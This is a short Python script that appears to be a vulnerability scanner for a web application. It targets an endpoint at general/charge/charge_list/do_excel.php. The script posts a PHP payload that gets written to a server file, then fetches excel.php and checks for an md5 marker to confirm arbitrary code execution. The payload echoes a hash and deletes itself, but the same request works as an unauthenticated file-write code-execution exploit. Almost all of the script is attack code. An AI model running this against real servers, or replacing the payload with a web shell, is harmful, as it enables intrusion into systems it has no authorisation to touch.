import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(100000, 999999)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/charge/charge_list/do_excel.php"
	headers={"Content-Type": "application/x-www-form-urlencoded"}
	body=f'html=<?php echo md5({rand});unlink(__FILE__);?>'
	response=requests.post(url,body,headers=headers,verify=False,timeout=5)
	if True:
		r0=True
	else:
		r0=False
	url=baseurl+"general/charge/charge_list/excel.php"
	response=requests.get(url,verify=False,timeout=5)
	if md5(str(rand).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
